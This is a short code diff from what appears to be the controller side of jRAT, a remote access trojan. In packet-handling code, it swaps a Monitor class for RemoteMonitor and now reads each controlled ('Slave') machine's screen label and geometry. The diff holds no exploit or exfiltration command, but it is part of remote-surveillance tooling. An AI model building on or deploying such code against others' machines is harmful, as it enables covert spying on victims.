@@ -1,9 +1,10 @@
 package io.jrat.client.packets.incoming;
 
-import io.jrat.client.Monitor;
 import io.jrat.client.Slave;
 
 import java.io.DataInputStream;
+
+import com.redpois0n.graphs.monitors.RemoteMonitor;
 
 
 public class Packet61InitMonitors extends AbstractIncomingPacket {
@@ -12,14 +13,16 @@ public class Packet61InitMonitors extends AbstractIncomingPacket {
 	public void read(Slave slave, DataInputStream dis) throws Exception {
 		int len = slave.readInt();
 
-		slave.setMonitors(new Monitor[len]);
+		slave.setMonitors(new RemoteMonitor[len]);
 
-		for (int i = 0; i < len; i++) {
-			String name = slave.readLine();
-			Monitor monitor = new Monitor();
+		for (int i = 0; i < len; i++) {			
+			String label = slave.readLine();
+			int x = dis.readInt();
+			int y = dis.readInt();
+			int width = dis.readInt();
+			int height = dis.readInt();
 
-			monitor.setName(name);
-			monitor.setIndex(i);
+			RemoteMonitor monitor = new RemoteMonitor(label, x, y, width, height);
 
 			slave.getMonitors()[i] = monitor;
 		}
